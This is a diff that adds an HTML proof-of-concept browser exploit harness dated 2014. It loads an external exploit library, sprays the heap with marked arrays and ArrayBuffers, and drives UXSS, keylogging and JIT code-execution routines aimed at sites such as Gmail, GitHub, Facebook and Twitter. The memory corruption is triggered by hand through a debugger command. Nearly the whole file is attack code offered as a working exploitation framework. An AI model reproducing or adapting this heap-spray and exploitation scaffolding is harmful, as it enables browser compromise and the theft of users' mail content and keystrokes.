@@ -1,0 +1,262 @@
+<!--
+ Author: Chen Zhang (@demi6od) <demi6d@gmail.com>
+ Date: 2014 May 23rd
+-->
+
+<html>
+    <body></body>
+    <script src="ChromeExpLib.js"></script>
+    <script>
+        var IS_RELEASE = true;
+
+        // Run calc needs --no-sandbox
+        var IS_UXSS = false;
+        var IS_MOD_VTBL = false;
+
+        var IS_IFRAME = true;
+        var IS_KEYLOG = true;
+
+        gIframes = [];
+        gWins = [];
+
+        if (IS_UXSS) {
+            if (IS_IFRAME) {
+                setTimeout("appendIframes(urls);", 1000);
+            } else {
+                setTimeout("openWins(urls);", 1000);
+            }
+        }
+
+        //urls = ["http://www.baidu.com", "http://www.weibo.com", "http://www.aol.com", "http://mail.163.com"];
+        urls = ["https://github.com", "https://www.facebook.com", "https://twitter.com", "https://mail.google.com"];
+
+        if (IS_KEYLOG) {
+            urls = ["https://mail.google.com"];
+        }
+
+        function appendIframes(urls) {
+            for (var i = 0; i < urls.length; i++) {
+                gIframes[i] = document.createElement("iframe");
+                if (IS_KEYLOG) {
+                    gIframes[i].frameBorder = 0;
+                    gIframes[i].width = "100%";
+                    gIframes[i].height = "100%";
+                }
+                //gIframes[i].src = urls[i];
+                //gIframes[i].sandbox = "allow-same-origin";
+                document.body.appendChild(gIframes[i]);
+            }
+        }
+
+        function openWins(urls) {
+            for (var i = 0; i < urls.length; i++) {
+                gWins[i] = open(urls[i]);
+            }
+        }
+
+        function dword2Int(data) {
+            return data >> 1;
+        }
+
+        /* Sprayed memory chunk layout 
+           ------------------------
+           |size|flags|aStart|aEnd|
+           |  ...                 |
+           ------------------------
+           |  00000000            |
+           |  ...                 |
+           ------------------------
+ aStart -> |map|length|           |
+           ------------
+           |  arrBuf pointer | 1  |
+           |  arrBuf pointer | 1  |
+           |  arrBuf pointer | 1  |
+           |  ...                 |
+           |  number << 1         |
+           |  number << 1         |
+           |  number << 1         |
+           |  ...                 |
+           ------------------------
+           |  ...                 |
+           ------------------------
+           |map|length|           |
+           ------------
+           |  arrBuf pointer | 1  |
+           |  arrBuf pointer | 1  |
+           |  arrBuf pointer | 1  |
+           |  ...                 |
+           |  number << 1         |
+           |  number << 1         |
+           |  number << 1         |
+           |  ...                 |
+           ------------------------
+           |  arrBuf              |
+           |                      |
+                      -------------
+           |          |           |
+           ------------
+           |  arrBuf              |
+           |                      |
+           ------------------------
+           |  arrBuf              |
+           |                      |
+                      -------------
+           |          |           |
+           ------------
+           |  arrBuf              |
+           |                      |
+           ------------------------
+           |  ...                 |
+           ------------------------
+        */
+        function arrSpray() {
+            fixedArrs = [];
+
+            arrDataSize = 0x10 * 4;
+            arrBufSize = 0x500;
+
+            var map = 0x4;
+            var length = 0x4;
+            fixedArrSize = 0x10000;
+            var fixedArrLen = (fixedArrSize - map - length) / 4;
+
+            if (IS_RELEASE) {
+                var fixedArrNum = 0x2000;
+            } else {
+                var fixedArrNum = 0x1800;
+            }
+
+            var arrBufNum = arrBufSize / 0x28;
+
+            for (var i = 0; i < fixedArrNum; i++) {
+                fixedArrs[i] = new Array(fixedArrLen);
+
+                for (var j = 0; j < arrBufNum; j++) {
+                    fixedArrs[i][j] = new ArrayBuffer(arrDataSize);
+                }
+
+                var dataStartIdx = Math.ceil(arrBufNum / 0x100) * 0x100;
+                for (var j = dataStartIdx; j < fixedArrLen ; j += 0x40) {
+                    fixedArrs[i][j + 0x0] = dword2Int(0x41410001);
+                    fixedArrs[i][j + 0x1] = dword2Int(0x41410011);
+                    fixedArrs[i][j + 0x2] = dword2Int(0x41410021);
+                    fixedArrs[i][j + 0x3] = dword2Int(0x41410031);
+                    fixedArrs[i][j + 0x4] = dword2Int(0x41410041);
+                    fixedArrs[i][j + 0x5] = dword2Int(0x41410051);
+                    fixedArrs[i][j + 0x6] = dword2Int(0x41410061);
+                    fixedArrs[i][j + 0x7] = dword2Int(0x41410071);
+                    fixedArrs[i][j + 0x8] = dword2Int(0x41410081);
+                    fixedArrs[i][j + 0x9] = dword2Int(0x41410091);
+                    fixedArrs[i][j + 0xa] = dword2Int(0x414100a1);
+                    fixedArrs[i][j + 0xb] = dword2Int(0x414100b1);
+                    fixedArrs[i][j + 0xc] = dword2Int(0x414100c1);
+                    fixedArrs[i][j + 0xd] = dword2Int(0x414100d1);
+                    fixedArrs[i][j + 0xe] = dword2Int(0x414100e1);
+                    fixedArrs[i][j + 0xf] = dword2Int(0x414100f1);
+
+                    fixedArrs[i][j + 0x10] = dword2Int(0x41410101);
+                    fixedArrs[i][j + 0x11] = dword2Int(0x41410111);
+                    fixedArrs[i][j + 0x12] = dword2Int(0x41410121);
+                    fixedArrs[i][j + 0x13] = dword2Int(0x41410131);
+                    fixedArrs[i][j + 0x14] = dword2Int(0x41410141);
+                    fixedArrs[i][j + 0x15] = dword2Int(0x41410151);
+                    fixedArrs[i][j + 0x16] = dword2Int(0x41410161);
+                    fixedArrs[i][j + 0x17] = dword2Int(0x41410171);
+                    fixedArrs[i][j + 0x18] = dword2Int(0x41410181);
+                    fixedArrs[i][j + 0x19] = dword2Int(0x41410191);
+                    fixedArrs[i][j + 0x1a] = dword2Int(0x414101a1);
+                    fixedArrs[i][j + 0x1b] = dword2Int(0x414101b1);
+                    fixedArrs[i][j + 0x1c] = dword2Int(0x414101c1);
+                    fixedArrs[i][j + 0x1d] = dword2Int(0x414101d1);
+                    fixedArrs[i][j + 0x1e] = dword2Int(0x414101e1);
+                    fixedArrs[i][j + 0x1f] = dword2Int(0x414101f1);
+
+                    fixedArrs[i][j + 0x20] = dword2Int(0x41410201);
+                    fixedArrs[i][j + 0x21] = dword2Int(0x41410211);
+                    fixedArrs[i][j + 0x22] = dword2Int(0x41410221);
+                    fixedArrs[i][j + 0x23] = dword2Int(0x41410231);
+                    fixedArrs[i][j + 0x24] = dword2Int(0x41410241);
+                    fixedArrs[i][j + 0x25] = dword2Int(0x41410251);
+                    fixedArrs[i][j + 0x26] = dword2Int(0x41410261);
+                    fixedArrs[i][j + 0x27] = dword2Int(0x41410271);
+                    fixedArrs[i][j + 0x28] = dword2Int(0x41410281);
+                    fixedArrs[i][j + 0x29] = dword2Int(0x41410291);
+                    fixedArrs[i][j + 0x2a] = dword2Int(0x414102a1);
+                    fixedArrs[i][j + 0x2b] = dword2Int(0x414102b1);
+                    fixedArrs[i][j + 0x2c] = dword2Int(0x414102c1);
+                    fixedArrs[i][j + 0x2d] = dword2Int(0x414102d1);
+                    fixedArrs[i][j + 0x2e] = dword2Int(0x414102e1);
+                    fixedArrs[i][j + 0x2f] = dword2Int(0x414102f1);
+
+                    fixedArrs[i][j + 0x30] = dword2Int(0x41410301);
+                    fixedArrs[i][j + 0x31] = dword2Int(0x41410311);
+                    fixedArrs[i][j + 0x32] = dword2Int(0x41410321);
+                    fixedArrs[i][j + 0x33] = dword2Int(0x41410331);
+                    fixedArrs[i][j + 0x34] = dword2Int(0x41410341);
+                    fixedArrs[i][j + 0x35] = dword2Int(0x41410351);
+                    fixedArrs[i][j + 0x36] = dword2Int(0x41410361);
+                    fixedArrs[i][j + 0x37] = dword2Int(0x41410371);
+
+                    fixedArrs[i][j + 0x38] = dword2Int(0x41410381);
+                    fixedArrs[i][j + 0x39] = dword2Int(0x41410391);
+                    fixedArrs[i][j + 0x3a] = dword2Int(0x414103a1);
+                    fixedArrs[i][j + 0x3b] = dword2Int(0x414103b1);
+                    fixedArrs[i][j + 0x3c] = dword2Int(0x414103c1);
+                    fixedArrs[i][j + 0x3d] = dword2Int(0x414103d1);
+
+                    if ((j + 0x3e) != fixedArrLen) {
+                        fixedArrs[i][j + 0x3e] = dword2Int(0x414103e1);
+                        fixedArrs[i][j + 0x3f] = dword2Int(0x414103f1);
+                    }
+                }
+
+                // Set array start and end tag
+                fixedArrs[i][dataStartIdx] = dword2Int(0x0eadc0de);
+                fixedArrs[i][fixedArrLen - 1] = dword2Int(0x0eadc0de);
+            }
+        }
+
+        arrSpray();
+
+        function exploit() {
+            // For debug break point
+            //parseFloat('1.1');
+
+            // Modify fixed array's length field through vulnerability or windbg
+            if (IS_RELEASE) {
+                alert('[+] Execute windbg command: ed 0x3ff08080+4 0x0f000000');
+            } else {
+                alert('[+] Execute windbg command: ed 0x41008080+4 0x0f000000');
+            }
+
+            if (IS_RELEASE) {
+                var sprayPageBase = 0x3ff00000;
+            } else {
+                var sprayPageBase = 0x41000000;
+            }
+            var fixedArrOff = 0x8080;
+            cmExpLib.initialize(fixedArrs, fixedArrSize, arrBufSize, arrDataSize, sprayPageBase + fixedArrOff); 
+
+            if (IS_UXSS) {
+                // UXSS exploit
+                for (var i = 0; i < urls.length; i++) {
+                    if (IS_IFRAME) {
+                        cmExpLib.exploitUXSSIfr(i, true);
+                    } else {
+                        cmExpLib.exploitUXSSWin(i);
+                    }
+                }
+            } else {
+                // JIT exploit
+                cmExpLib.exploit();
+            }
+
+            cmExpLib.expTestCase();
+
+            // For debug break point
+            //parseFloat('1.1');
+        }
+
+        setTimeout('exploit();', 5000);
+    </script>
+</html>
